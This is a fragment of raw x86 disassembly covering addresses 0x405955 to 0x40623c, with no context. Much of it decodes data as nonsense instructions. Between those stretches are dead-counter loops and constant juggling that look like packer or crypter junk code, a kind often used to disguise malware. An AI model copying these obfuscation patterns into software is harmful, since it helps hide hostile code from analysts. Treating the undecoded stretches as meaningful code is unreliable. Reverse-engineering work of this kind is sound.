  405955:	xchg   DWORD PTR [ebp+0x47],edi
  405958:	push   es
  405959:	push   ebx
  40595a:	ins    DWORD PTR es:[edi],dx
  40595b:	mov    esp,0xcb98171d
  405960:	out    dx,al
  405961:	jae    0x40598b
  405963:	fbld   TBYTE PTR [ebp+0x4b7902d1]
  405969:	fwait
  40596a:	shr    DWORD PTR [edx-0x5e7529c9],1
  405970:	push   cs
  405971:	mov    edi,fs
  405973:	xchg   esi,eax
  405974:	mov    eax,ds:0x4351aa84
  405979:	mov    ebp,0xf9c37617
  40597e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40597f:	cli    
  405980:	mov    eax,ds:0xd2f75a6f
  405985:	aam    0xb5
  405987:	cmp    al,0x85
  405989:	pop    ds
  40598a:	imul   ebx,DWORD PTR [eax],0xffffffda
  40598d:	pop    eax
  40598e:	push   esp
  40598f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405990:	mov    ds:0xbc85c403,eax
  405995:	pop    esp
  405996:	leave  
  405997:	shl    DWORD PTR [ebp+0x63050bfc],cl
  40599d:	or     eax,0xc990e396
  4059a2:	add    DWORD PTR [edi-0xc],esi
  4059a5:	jae    0x4059d3
  4059a7:	xchg   esi,eax
  4059a8:	stos   DWORD PTR es:[edi],eax
  4059a9:	add    BYTE PTR [ebp-0x5fc8f51f],dh
  4059af:	inc    edx
  4059b0:	lods   al,BYTE PTR ds:[esi]
  4059b1:	jg     0x405a29
  4059b3:	adc    ch,BYTE PTR [eax]
  4059b5:	dec    edx
  4059b6:	jl     0x405a30
  4059b8:	add    DWORD PTR [ebx+0x16],0xffffffc0
  4059bc:	dec    esp
  4059bd:	mov    bl,0x8b
  4059bf:	or     eax,0x40d64c
  4059c4:	add    DWORD PTR [eax],ecx
  4059c6:	pop    edi
  4059c7:	pop    esi
  4059c8:	pop    ebx
  4059c9:	leave  
  4059ca:	ret    
  4059cb:	push   ebp
  4059cc:	mov    ebp,esp
  4059ce:	sub    esp,0x44
  4059d1:	push   edi
  4059d2:	sub    eax,DWORD PTR ds:0x4245b6
  4059d8:	mov    eax,DWORD PTR [ebp+0xc]
  4059db:	or     DWORD PTR ds:0x417e4d,edx
  4059e1:	mov    DWORD PTR [ebp-0x10],eax
  4059e4:	mov    DWORD PTR ds:0x417e55,0x17
  4059ee:	cmp    DWORD PTR ds:0x417e55,0x0
  4059f5:	je     0x405a59
  4059fb:	cmp    DWORD PTR ds:0x417e55,0x6
  405a02:	jne    0x405a2b
  405a08:	push   DWORD PTR [ebp-0x24]
  405a0b:	push   DWORD PTR [ebp-0x28]
  405a0e:	push   0x417e45
  405a13:	push   0x80ed
  405a18:	push   0x67be
  405a1d:	push   0x6b4c
  405a22:	push   DWORD PTR [ebp-0x20]
  405a25:	call   DWORD PTR ds:0x40d1cc
  405a2b:	cmp    DWORD PTR ds:0x417e55,0x7
  405a32:	jne    0x405a47
  405a38:	xor    ecx,ecx
  405a3a:	or     ecx,DWORD PTR ds:0x417e55
  405a40:	dec    ecx
  405a41:	mov    DWORD PTR ds:0x417e55,ecx
  405a47:	mov    ecx,DWORD PTR ds:0x417e55
  405a4d:	dec    ecx
  405a4e:	mov    DWORD PTR ds:0x417e55,ecx
  405a54:	jmp    0x4059ee
  405a59:	mov    eax,DWORD PTR [ebp+0x8]
  405a5c:	or     DWORD PTR ds:0x417e41,0x3fc5
  405a66:	mov    DWORD PTR [ebp+0x8],0xf89c8538
  405a6d:	xor    ecx,ecx
  405a6f:	add    ecx,DWORD PTR ds:0x4245b2
  405a75:	and    DWORD PTR ds:0x41abd6,ecx
  405a7b:	mov    DWORD PTR [ebp-0x20],0xf89c853b
  405a82:	mov    edx,DWORD PTR [ebp+0x8]
  405a85:	mov    DWORD PTR [ebp-0x40],eax
  405a88:	mov    eax,0x7510859
  405a8d:	xor    edx,eax
  405a8f:	adc    ecx,ecx
  405a91:	mov    ecx,0x32729f
  405a96:	movzx  edi,WORD PTR ds:0x41510d
  405a9d:	sbb    DWORD PTR ds:0x4245be,edi
  405aa3:	add    edx,ecx
  405aa5:	add    DWORD PTR ds:0x412354,0x1575
  405aaf:	mov    DWORD PTR [ebp-0x8],edx
  405ab2:	jmp    0x405c04
  405ab7:	(bad)  [edi+ebp*4-0x19]
  405abb:	mov    eax,ds:0x80785be5
  405ac0:	cmp    DWORD PTR ds:[edi],edx
  405ac3:	(bad)  
  405ac4:	mov    ecx,0xb86e2f2
  405ac9:	jle    0x405b49
  405acb:	and    edi,DWORD PTR [edi+0x7e]
  405ace:	jle    0x405ad8
  405ad0:	int    0xcc
  405ad2:	out    0x54,al
  405ad4:	adc    ebp,DWORD PTR [edi-0x47385601]
  405ada:	imul   BYTE PTR [ecx]
  405adc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405add:	push   ss
  405ade:	fst    QWORD PTR [edi+ecx*1-0x644cf412]
  405ae5:	into   
  405ae6:	imul   esp,DWORD PTR [esi],0xf0223bce
  405aec:	cmp    al,0xc1
  405aee:	scas   al,BYTE PTR es:[edi]
  405aef:	cmp    BYTE PTR [edx-0x1aa065ad],dl
  405af5:	cli    
  405af6:	js     0x405acd
  405af8:	mov    eax,ds:0xa97e2d98
  405afd:	aad    0x1f
  405aff:	jae    0x405a84
  405b01:	mov    edx,0x211a6069
  405b06:	xchg   edx,eax
  405b07:	mov    eax,ds:0xad69368c
  405b0c:	mov    dl,0x97
  405b0e:	sbb    cl,al
  405b10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b11:	mov    bh,0x3d
  405b13:	test   eax,0xdaa93132
  405b18:	xor    eax,0xa3257e73
  405b1d:	addr16 push ebp
  405b1f:	push   cs
  405b20:	int3   
  405b21:	sub    ah,dh
  405b23:	jge    0x405b27
  405b25:	or     ebx,edx
  405b27:	push   0xffffffc3
  405b29:	jge    0x405b95
  405b2b:	aam    0x42
  405b2d:	imul   edi,edx,0x22
  405b30:	pavgb  mm5,mm7
  405b33:	loop   0x405b5e
  405b35:	(bad)  
  405b36:	xchg   esp,eax
  405b37:	ret    
  405b38:	sub    al,BYTE PTR [esi+0x53]
  405b3b:	sub    dh,BYTE PTR [edx-0x61]
  405b3e:	(bad)  
  405b3f:	pusha  
  405b40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b41:	add    ebp,DWORD PTR [esi+0x13bc27e8]
  405b47:	xchg   esi,eax
  405b48:	xchg   edx,eax
  405b49:	scas   eax,DWORD PTR es:[edi]
  405b4a:	int3   
  405b4b:	test   bl,dh
  405b4d:	sub    bh,BYTE PTR [ebx+0x337bf0bd]
  405b53:	sti    
  405b54:	rcr    BYTE PTR [edx-0x2968e882],cl
  405b5a:	in     eax,0x5f
  405b5c:	loop   0x405ae0
  405b5e:	inc    ebx
  405b5f:	shl    DWORD PTR [ebx+0x7c35f64e],cl
  405b65:	sbb    al,0x73
  405b67:	ret    0x3b1c
  405b6a:	jb     0x405bcd
  405b6c:	sub    al,BYTE PTR [esi]
  405b6e:	push   ss
  405b6f:	test   al,0x59
  405b71:	sti    
  405b72:	pop    ss
  405b73:	add    BYTE PTR [ecx+ebp*4],bh
  405b76:	pop    es
  405b77:	enter  0xd251,0xe8
  405b7b:	into   
  405b7c:	adc    eax,0x5db3a647
  405b81:	outs   dx,BYTE PTR ds:[esi]
  405b82:	mov    ds:0x9cf3b18f,eax
  405b87:	push   ecx
  405b88:	or     eax,0x942065e2
  405b8d:	mov    dh,0x99
  405b8f:	stos   BYTE PTR es:[edi],al
  405b90:	scas   al,BYTE PTR es:[edi]
  405b91:	pop    eax
  405b92:	out    0x9f,al
  405b94:	adc    eax,0xf06a62d7
  405b99:	jbe    0x405bec
  405b9b:	loope  0x405bc8
  405b9d:	mov    ah,0x3a
  405b9f:	fild   DWORD PTR [bx+di+0x58]
  405ba3:	xor    cl,BYTE PTR [ebx+0x13acfd27]
  405ba9:	lods   eax,DWORD PTR ds:[esi]
  405baa:	xchg   ecx,eax
  405bab:	dec    ecx
  405bac:	adc    al,0xba
  405bae:	retf   0x717
  405bb1:	adc    eax,0x7bf19c3e
  405bb6:	rcr    DWORD PTR [edx+0x4f],1
  405bb9:	(bad)  [ebx+0x38bdc006]
  405bbf:	(bad)  
  405bc0:	(bad)  
  405bc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405bc2:	and    edi,DWORD PTR cs:[edx+0xc]
  405bc6:	cmp    ebx,DWORD PTR [edi]
  405bc8:	stc    
  405bc9:	daa    
  405bca:	out    dx,eax
  405bcb:	je     0x405b79
  405bcd:	adc    DWORD PTR [edx],esi
  405bcf:	sbb    ecx,ebx
  405bd1:	pushf  
  405bd2:	lds    esp,FWORD PTR [eax]
  405bd4:	cmp    edx,DWORD PTR [ebp-0x5f]
  405bd7:	add    BYTE PTR [ebx],cl
  405bd9:	xor    ch,BYTE PTR [esi+0x62bec139]
  405bdf:	mov    bh,0x37
  405be1:	xor    ch,BYTE PTR [eax+0x671dc0f3]
  405be7:	dec    ebx
  405be8:	les    eax,FWORD PTR [edx-0x1fc8db38]
  405bee:	fwait
  405bef:	mov    DWORD PTR cs:[edi],edx
  405bf2:	pushf  
  405bf3:	sahf   
  405bf4:	repnz loope 0x405b8a
  405bf7:	mov    bl,0x85
  405bf9:	ss sub BYTE PTR cs:[edx-0x31],ch
  405bfe:	sub    esi,0x19d7f397
  405c04:	mov    edx,DWORD PTR [ebp+0x8]
  405c07:	and    DWORD PTR ds:0x4245c6,0x0
  405c11:	jmp    0x405c25
  405c16:	xor    edi,edi
  405c18:	or     edi,DWORD PTR ds:0x4245c6
  405c1e:	inc    edi
  405c1f:	mov    DWORD PTR ds:0x4245c6,edi
  405c25:	cmp    DWORD PTR ds:0x4245c6,0x11
  405c2c:	jae    0x405c53
  405c32:	cmp    DWORD PTR ds:0x4245c6,0x1a
  405c39:	jne    0x405c48
  405c3f:	push   DWORD PTR [ebp-0x1c]
  405c42:	call   DWORD PTR ds:0x40d29c
  405c48:	jmp    0x405c16
  405c4d:	xor    DWORD PTR ds:0x412358,ebx
  405c53:	xor    edx,eax
  405c55:	add    edx,ecx
  405c57:	jmp    0x405da9
  405c5c:	xchg   edi,eax
  405c5d:	(bad)  
  405c5e:	call   0xe86f:0x6bdabbc6
  405c65:	pop    ds
  405c66:	jb     0x405cc2
  405c68:	mov    al,0xf1
  405c6a:	dec    edi
  405c6b:	iret   
  405c6c:	dec    ebx
  405c6d:	or     BYTE PTR [esi+0x7e],bh
  405c70:	and    edi,DWORD PTR [edi+0x7e]
  405c73:	jle    0x405bf5
  405c75:	add    DWORD PTR [esi+esi*2-0x4f],ebx
  405c79:	push   0xffffffff
  405c7b:	xchg   ecx,eax
  405c7c:	dec    edx
  405c7d:	jnp    0x405c01
  405c7f:	sbb    cl,BYTE PTR [edi-0x3f16f0c0]
  405c85:	cmp    al,0xfc
  405c87:	cmp    cl,dh
  405c89:	add    DWORD PTR ds:[edi+eiz*1+0x78],edx
  405c8e:	mov    ecx,0xee6a5388
  405c93:	mov    ah,0x4d
  405c95:	rcr    DWORD PTR [esi],0x29
  405c98:	xor    DWORD PTR [eax+0xa],eax
  405c9b:	lock js 0x405c52
  405c9e:	mov    al,ds:0x8bd37c3b
  405ca3:	cs pop ebx
  405ca5:	jp     0x405ce5
  405ca7:	and    ebx,DWORD PTR [eax-0x7768835f]
  405cad:	xchg   ecx,eax
  405cae:	jb     0x405c38
  405cb0:	inc    ebx
  405cb1:	xchg   esi,eax
  405cb2:	push   ebx
  405cb3:	bnd jae 0x405d0e
  405cb6:	pop    es
  405cb7:	cld    
  405cb8:	pop    ebp
  405cb9:	sub    bh,al
  405cbb:	push   edi
  405cbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405cbd:	lahf   
  405cbe:	jbe    0x405cb8
  405cc0:	fnsave [ebp-0x2928d42c]
  405cc6:	scas   eax,DWORD PTR es:[edi]
  405cc7:	std    
  405cc8:	push   ecx
  405cc9:	xor    eax,0x737f06f5
  405cce:	mov    esi,DWORD PTR [edi-0x3efd25d8]
  405cd4:	dec    edi
  405cd5:	cdq    
  405cd6:	inc    esi
  405cd7:	jmp    0xb676e8d0
  405cdc:	in     al,dx
  405cdd:	lahf   
  405cde:	fadd   QWORD PTR [ebx*4-0x4e6860fe]
  405ce5:	ficomp DWORD PTR [edi]
  405ce7:	add    BYTE PTR [ebp-0x78],ch
  405cea:	sub    DWORD PTR [eax],ecx
  405cec:	dec    ebp
  405ced:	jbe    0x405cf4
  405cef:	xchg   edx,eax
  405cf0:	clc    
  405cf1:	add    esp,edx
  405cf3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405cf4:	jle    0x405d6b
  405cf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405cf7:	ins    DWORD PTR es:[edi],dx
  405cf8:	addr16 sub dl,0x8a
  405cfc:	(bad)  
  405cfd:	mov    ds:0xf3cd53d8,al
  405d02:	cli    
  405d03:	jmp    0x405cab
  405d05:	mov    fs,WORD PTR ds:0x3eeca075
  405d0b:	cmp    al,0xed
  405d0d:	call   0x70c:0x40261071
  405d14:	inc    eax
  405d15:	ficomp WORD PTR [esi]
  405d17:	xchg   edi,eax
  405d18:	inc    eax
  405d19:	(bad)  
  405d1a:	jns    0x405d12
  405d1c:	test   al,0x42
  405d1e:	stos   DWORD PTR es:[edi],eax
  405d1f:	xlat   BYTE PTR ds:[ebx]
  405d20:	nop
  405d21:	(bad)  
  405d22:	into   
  405d23:	in     al,dx
  405d24:	mov    dl,0xe
  405d26:	fisttp WORD PTR [ebx-0x17a884a3]
  405d2c:	sbb    eax,0xa4a0629c
  405d31:	dec    edi
  405d32:	pop    edi
  405d33:	lock int 0x11
  405d36:	in     eax,dx
  405d37:	dec    ecx
  405d38:	mov    dh,0x21
  405d3a:	dec    ebx
  405d3b:	pop    ecx
  405d3c:	mov    ah,0xf7
  405d3e:	fidiv  DWORD PTR [esi-0x3a]
  405d41:	retf   
  405d42:	jnp    0x405d48
  405d44:	xor    al,0x1c
  405d46:	(bad)  
  405d47:	loopne 0x405d57
  405d49:	mov    eax,0x2a1874
  405d4e:	xor    esp,ebp
  405d50:	xchg   edi,eax
  405d51:	push   edi
  405d52:	pcmpgtw mm5,QWORD PTR [ecx-0x6d137214]
  405d59:	call   0x5607:0xcc11319c
  405d60:	and    al,0x1d
  405d62:	mov    esp,DWORD PTR [ecx+0x59206935]
  405d68:	rol    DWORD PTR [edx-0x31],0xe2
  405d6c:	ret    0x2116
  405d6f:	inc    ebx
  405d70:	lock mov al,0x20
  405d73:	cld    
  405d74:	cdq    
  405d75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d76:	push   ebp
  405d77:	addr16 sbb al,0xf9
  405d7a:	lahf   
  405d7b:	ror    edi,0xf6
  405d7e:	gs jae 0x405d52
  405d81:	dec    eax
  405d82:	mov    ds:0x6f8200c9,al
  405d87:	cmc    
  405d88:	sub    BYTE PTR [esi-0x77],dh
  405d8b:	dec    edi
  405d8c:	or     eax,DWORD PTR [edi+0x36]
  405d8f:	sub    esp,esp
  405d91:	xchg   edx,eax
  405d92:	xchg   esi,eax
  405d93:	(bad)
  405d98:	add    BYTE PTR [edi+0x2de338c3],bl
  405d9e:	data16 rcr BYTE PTR [ecx-0x38],1
  405da2:	ret    0x797
  405da5:	jp     0x405d9f
  405da7:	push   esp
  405da8:	out    dx,al
  405da9:	mov    DWORD PTR [ebp+0xc],edx
  405dac:	inc    edi
  405dad:	jmp    0x405eff
  405db2:	or     eax,0xb8afae9b
  405db7:	mov    ebx,0x598db90d
  405dbc:	or     al,0x3
  405dbe:	hlt    
  405dbf:	jae    0x405e0b
  405dc1:	mov    ebx,0x7e7e0e7c
  405dc6:	and    edi,DWORD PTR [edi+0x7e]
  405dc9:	jle    0x405da1
  405dcb:	dec    eax
  405dcc:	fdiv   QWORD PTR [ecx-0x74862419]
  405dd2:	add    bh,al
  405dd4:	dec    ecx
  405dd5:	icebp  
  405dd6:	icebp  
  405dd7:	fsubr  DWORD PTR [eax-0x24d2da3d]
  405ddd:	mov    DWORD PTR [ecx+ebp*1-0x7a],ebx
  405de1:	inc    ecx
  405de2:	daa    
  405de3:	js     0x405dda
  405de5:	push   ss
  405de6:	lds    esi,FWORD PTR [edi+0x5c]
  405de9:	adc    DWORD PTR [esi-0x22],ecx
  405dec:	mov    BYTE PTR [ecx],bl
  405dee:	sub    al,0xd8
  405df0:	cwde   
  405df1:	movsx  esi,BYTE PTR [edx-0x276321b2]
  405df8:	ins    DWORD PTR es:[edi],dx
  405df9:	pushf  
  405dfa:	xor    ch,BYTE PTR [ebx]
  405dfc:	call   0xb168:0xa667d2d3
  405e03:	stos   BYTE PTR es:[edi],al
  405e04:	jb     0x405ded
  405e06:	adc    DWORD PTR [eax+ebx*8-0x73e506e7],0x5e08c26
  405e11:	jo     0x405e36
  405e13:	push   ebp
  405e14:	adc    ch,BYTE PTR [ecx-0x74]
  405e17:	pusha  
  405e18:	fcmove st,st(6)
  405e1a:	add    eax,0x3fc6ac4f
  405e1f:	pop    esp
  405e20:	add    al,0x2b
  405e22:	jmp    0x11c8:0x72f59368
  405e29:	mov    eax,0x5afadc5d
  405e2e:	pop    ecx
  405e2f:	jp     0x405def
  405e31:	div    BYTE PTR [edx]
  405e33:	mov    al,0x5
  405e35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e36:	test   BYTE PTR [edi+0x458e047f],cl
  405e3c:	mov    WORD PTR [edx],?
  405e3e:	xchg   ebp,eax
  405e3f:	ins    DWORD PTR es:[edi],dx
  405e40:	jl     0x405e27
  405e42:	(bad)  
  405e43:	xchg   esi,edx
  405e45:	int3   
  405e46:	push   ecx
  405e47:	add    eax,0xfb95ee76
  405e4c:	sahf   
  405e4d:	add    bh,cl
  405e4f:	push   0x36fccc5a
  405e54:	or     BYTE PTR [edi-0x32],dl
  405e57:	mov    ah,0x1e
  405e59:	scas   al,BYTE PTR es:[edi]
  405e5a:	sub    al,0xec
  405e5c:	int3   
  405e5d:	push   ds
  405e5e:	push   ecx
  405e5f:	mov    bl,0xaf
  405e61:	in     eax,dx
  405e62:	jl     0x405e5e
  405e64:	add    al,0x53
  405e66:	outs   dx,DWORD PTR ds:[esi]
  405e67:	icebp  
  405e68:	in     eax,dx
  405e69:	inc    eax
  405e6a:	lock mov al,ds:0x913d9d7a
  405e70:	lock fwait
  405e72:	or     al,0xba
  405e74:	sbb    BYTE PTR [edx+0x1b46d2e7],ch
  405e7a:	and    al,0x36
  405e7c:	or     cl,BYTE PTR [esi+0x7d]
  405e7f:	push   eax
  405e80:	jg     0x405e96
  405e82:	bound  ebx,QWORD PTR [esi+0x4c]
  405e85:	dec    DWORD PTR [ebp+ebx*1+0x74]
  405e89:	push   esi
  405e8a:	call   0x3ce6:0x2a550096
  405e91:	fwait
  405e92:	(bad)  
  405e93:	hlt    
  405e94:	mov    al,ds:0x116e3911
  405e99:	inc    esi
  405e9a:	dec    ebx
  405e9b:	aaa    
  405e9c:	mov    esi,ss
  405e9e:	ficomp DWORD PTR [eax+0x78]
  405ea1:	fcomp  DWORD PTR [ebx-0x44]
  405ea4:	sbb    eax,0x749f38c6
  405ea9:	imul   ecx,DWORD PTR [ebx+0x7893ca30],0x1d
  405eb0:	pop    ss
  405eb1:	inc    ebx
  405eb2:	or     al,0xf6
  405eb4:	adc    eax,0x9115c29
  405eb9:	mov    al,0x51
  405ebb:	js     0x405ea0
  405ebd:	popf   
  405ebe:	sbb    DWORD PTR [ebx+0x4d9b66fc],ecx
  405ec4:	jns    0x405ea3
  405ec6:	in     eax,0xb2
  405ec8:	fisttp WORD PTR [esi-0xb]
  405ecb:	jp     0x405eb3
  405ecd:	mov    ss,WORD PTR [edx+0x7f]
  405ed0:	scas   al,BYTE PTR es:[edi]
  405ed1:	adc    BYTE PTR [ebp+eax*1+0x7c],0x28
  405ed6:	sub    al,0x80
  405ed8:	xchg   BYTE PTR [esi-0xe88feee],dl
  405ede:	push   edx
  405edf:	pop    ecx
  405ee0:	daa    
  405ee1:	adc    eax,0x57338e3b
  405ee6:	imul   ecx,DWORD PTR [ecx],0x1b38cbe7
  405eec:	popa   
  405eed:	shl    DWORD PTR [edx],0xbd
  405ef0:	out    0x96,al
  405ef2:	cdq    
  405ef3:	jns    0x405f27
  405ef5:	(bad)  
  405ef7:	xlat   BYTE PTR ds:[ebx]
  405ef8:	mov    ch,0x8
  405efa:	dec    ecx
  405efb:	and    ecx,DWORD PTR [ebx+edx*8]
  405efe:	mov    ah,0xc7
  405f00:	inc    ebp
  405f01:	cld    
  405f02:	fadd   DWORD PTR [ebp-0xcc0764]
  405f08:	xor    edi,DWORD PTR ds:0x415109
  405f0e:	adc    edi,DWORD PTR ds:0x4245ae
  405f14:	mov    DWORD PTR ds:0x415109,edi
  405f1a:	mov    DWORD PTR [ebp-0x28],0xf89c853a
  405f21:	mov    DWORD PTR [ebp-0x2c],0xf89c853d
  405f28:	adc    edi,edi
  405f2a:	mov    DWORD PTR [ebp-0x30],0xf89c853c
  405f31:	or     DWORD PTR ds:0x4245be,edx
  405f37:	mov    DWORD PTR [ebp-0x34],0xf89c853f
  405f3e:	mov    DWORD PTR ds:0x417e41,0x15
  405f48:	cmp    DWORD PTR ds:0x417e41,0x0
  405f4f:	je     0x405fae
  405f55:	cmp    DWORD PTR ds:0x417e41,0x5
  405f5c:	jne    0x405f7c
  405f62:	push   0x43a6
  405f67:	push   0x41ac41
  405f6c:	push   0x41ac72
  405f71:	push   0x400000
  405f76:	call   DWORD PTR ds:0x40d1d0
  405f7c:	cmp    DWORD PTR ds:0x417e41,0x6
  405f83:	jne    0x405f96
  405f89:	mov    edi,DWORD PTR ds:0x417e41
  405f8f:	dec    edi
  405f90:	mov    DWORD PTR ds:0x417e41,edi
  405f96:	mov    edi,DWORD PTR ds:0x417e41
  405f9c:	dec    edi
  405f9d:	mov    DWORD PTR ds:0x417e41,edi
  405fa3:	jmp    0x405f48
  405fa8:	xor    edi,DWORD PTR ds:0x417e4d
  405fae:	mov    DWORD PTR [ebp-0x38],0xf89c853e
  405fb5:	and    DWORD PTR ds:0x412364,0xe44
  405fbf:	mov    DWORD PTR [ebp-0x3c],0xf89c8531
  405fc6:	or     DWORD PTR ds:0x417e49,0x6f97
  405fd0:	mov    edx,DWORD PTR [ebp+0x8]
  405fd3:	and    DWORD PTR ds:0x417e55,0x0
  405fdd:	jmp    0x405fef
  405fe2:	mov    edi,DWORD PTR ds:0x417e55
  405fe8:	inc    edi
  405fe9:	mov    DWORD PTR ds:0x417e55,edi
  405fef:	cmp    DWORD PTR ds:0x417e55,0x14
  405ff6:	jae    0x40601f
  405ffc:	cmp    DWORD PTR ds:0x417e55,0x1c
  406003:	jne    0x406014
  406009:	push   0x67ac
  40600e:	call   DWORD PTR ds:0x40d2a0
  406014:	jmp    0x405fe2
  406019:	sub    edi,DWORD PTR ds:0x412378
  40601f:	xor    edx,eax
  406021:	mov    edi,DWORD PTR [ebp-0x10]
  406024:	add    edx,ecx
  406026:	cmp    edi,edx
  406028:	mov    DWORD PTR ds:0x412368,0x5602
  406032:	je     0x407428
  406038:	mov    DWORD PTR ds:0x415109,0xf2d
  406042:	jmp    0x406194
  406047:	lock mov ebx,0xdc791c5b
  40604d:	jns    0x40600a
  40604f:	mov    eax,ds:0xfbdb13c5
  406054:	in     eax,0xa4
  406056:	pop    esp
  406057:	and    DWORD PTR [edi],ecx
  406059:	jle    0x4060d9
  40605b:	and    edi,DWORD PTR [edi+0x7e]
  40605e:	jle    0x406097
  406060:	mov    esi,0x6890bb9d
  406065:	cld    
  406066:	or     BYTE PTR [edx+0x192dd644],cl
  40606c:	(bad)  [ebp-0x232d1c41]
  406072:	mov    ch,BYTE PTR [eax+0x5b]
  406075:	cmp    ah,BYTE PTR [ebp+0x33]
  406078:	xchg   edx,eax
  406079:	jmp    0xbf47:0xf8d1e759
  406080:	and    ecx,DWORD PTR [ebx]
  406082:	mov    ecx,0xf5b23af6
  406087:	add    BYTE PTR [ebx+0x6f],ah
  40608a:	test   eax,0x4b55301d
  40608f:	inc    eax
  406090:	addr16 jp 0x4060b3
  406093:	pop    ecx
  406094:	sub    DWORD PTR [esi+0x1e],ebp
  406097:	xchg   eax,esi
  406099:	jmp    0xe8f64083
  40609e:	clc    
  40609f:	adc    dl,BYTE PTR [ebx]
  4060a1:	push   ss
  4060a2:	leave  
  4060a3:	sbb    BYTE PTR [edi+0xd929274],cl
  4060a9:	ins    DWORD PTR es:[edi],dx
  4060aa:	xor    BYTE PTR [edx],ah
  4060ac:	into   
  4060ad:	mov    ah,0x43
  4060af:	add    eax,0x1c8d9ded
  4060b4:	fisubr WORD PTR [edx]
  4060b6:	mov    al,0x30
  4060b8:	inc    edi
  4060b9:	and    edx,DWORD PTR [esi+0x48]
  4060bc:	xchg   ebx,eax
  4060bd:	shl    ebx,cl
  4060bf:	out    0x6e,eax
  4060c1:	cmp    dh,BYTE PTR [edi]
  4060c3:	dec    ebp
  4060c4:	jo     0x40606c
  4060c6:	test   DWORD PTR [ecx+0x62],eax
  4060c9:	outs   dx,DWORD PTR ds:[esi]
  4060ca:	pop    edx
  4060cb:	xor    eax,0x1c5e6c9b
  4060d0:	ds inc esp
  4060d2:	mov    eax,0xaafc2fd0
  4060d7:	push   esi
  4060d8:	push   ss
  4060d9:	mov    al,BYTE PTR [edi]
  4060db:	push   ebp
  4060dc:	loopne 0x4060b7
  4060de:	xor    al,0x95
  4060e0:	ds ins DWORD PTR es:[edi],dx
  4060e2:	in     al,0xf1
  4060e4:	ins    BYTE PTR es:[edi],dx
  4060e5:	fimul  DWORD PTR [ecx+0x41]
  4060e8:	push   edx
  4060e9:	icebp  
  4060ea:	rcr    DWORD PTR [edx-0x5229f40a],cl
  4060f0:	and    bh,BYTE PTR [esi+0x14]
  4060f3:	mov    dh,0x82
  4060f5:	fcomp  QWORD PTR [edx+ecx*1+0x47]
  4060f9:	sahf   
  4060fa:	in     eax,dx
  4060fb:	inc    edi
  4060fc:	in     eax,0x47
  4060fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060ff:	push   ds
  406100:	xor    ebx,DWORD PTR [edx+0x5035a4c4]
  406106:	mov    al,BYTE PTR [ecx-0x5af853de]
  40610c:	lea    esi,[ebx]
  40610e:	xchg   ecx,eax
  40610f:	mov    eax,ds:0xd7b08b30
  406114:	adc    edx,DWORD PTR [ebp-0x4eb6e109]
  40611a:	add    ch,BYTE PTR [eax]
  40611c:	pop    edi
  40611d:	mov    ah,0x21
  40611f:	ret    
  406120:	stos   BYTE PTR es:[edi],al
  406121:	pop    ss
  406122:	add    BYTE PTR [edi-0x3ef69e12],bl
  406128:	and    eax,0x7e16d10
  40612d:	and    eax,0xbcfa3a51
  406132:	ds pop ebx
  406134:	je     0x4060c6
  406136:	cmp    eax,0x533c162a
  40613b:	mov    BYTE PTR [edi-0x69a18eb5],dh
  406141:	clc    
  406142:	outs   dx,BYTE PTR ds:[esi]
  406143:	xchg   edx,eax
  406144:	fist   WORD PTR [esi]
  406146:	xor    al,0xf7
  406148:	aam    0xdc
  40614a:	cmc    
  40614b:	jnp    0x40615e
  40614d:	outs   dx,BYTE PTR ds:[esi]
  40614e:	outs   dx,DWORD PTR ds:[esi]
  40614f:	add    bh,bh
  406151:	xor    eax,0x639b135d
  406156:	or     DWORD PTR [ecx+0x71774c26],ebp
  40615c:	push   es
  40615d:	leave  
  40615e:	ds pushf 
  406160:	call   0x38665c90
  406165:	js     0x4061a6
  406167:	ficom  DWORD PTR [eax+0x62]
  40616a:	mov    DWORD PTR [esi-0x54],edx
  40616d:	mov    dl,0xa8
  40616f:	jl     0x40619e
  406171:	sahf   
  406172:	lock ins BYTE PTR es:[edi],dx
  406174:	push   0xd7470fbb
  406179:	adc    al,BYTE PTR [esi-0x6a308a5d]
  40617f:	lods   al,BYTE PTR ds:[esi]
  406180:	dec    edx
  406181:	cli    
  406182:	jmp    0x4061a0
  406184:	push   ds
  406185:	push   ss
  406186:	sti    
  406187:	and    BYTE PTR [edx-0x6d75022a],ch
  40618d:	sub    BYTE PTR [edi+0x78],al
  406190:	rol    DWORD PTR [ecx+edx*8-0x3a16acfa],1
  406197:	sldt   WORD PTR [eax]
  40619a:	and    DWORD PTR ds:0x412370,0x0
  4061a4:	jmp    0x4061b6
  4061a9:	mov    edx,DWORD PTR ds:0x412370
  4061af:	inc    edx
  4061b0:	mov    DWORD PTR ds:0x412370,edx
  4061b6:	cmp    DWORD PTR ds:0x412370,0x1e
  4061bd:	jae    0x4061ea
  4061c3:	cmp    DWORD PTR ds:0x412370,0x2a
  4061ca:	jne    0x4061e3
  4061d0:	push   DWORD PTR [ebp-0x10]
  4061d3:	push   0x41acf1
  4061d8:	push   0x41ac28
  4061dd:	call   DWORD PTR ds:0x40d000
  4061e3:	jmp    0x4061a9
  4061e8:	adc    edi,edi
  4061ea:	mov    edx,DWORD PTR [ebp-0x8]
  4061ed:	mov    DWORD PTR ds:0x412364,0x11
  4061f7:	cmp    DWORD PTR ds:0x412364,0x0
  4061fe:	je     0x406239
  406204:	cmp    DWORD PTR ds:0x412364,0x14
  40620b:	jne    0x406227
  406211:	push   0x44a4
  406216:	push   DWORD PTR [ebp-0x20]
  406219:	push   0x788c
  40621e:	push   DWORD PTR [ebp-0x10]
  406221:	call   DWORD PTR ds:0x40d360
  406227:	mov    edi,DWORD PTR ds:0x412364
  40622d:	dec    edi
  40622e:	mov    DWORD PTR ds:0x412364,edi
  406234:	jmp    0x4061f7
  406239:	mov    edi,DWORD PTR [ebp-0x10]
  40623c:	or     DWORD PTR ds:0x41235c,0x6f22
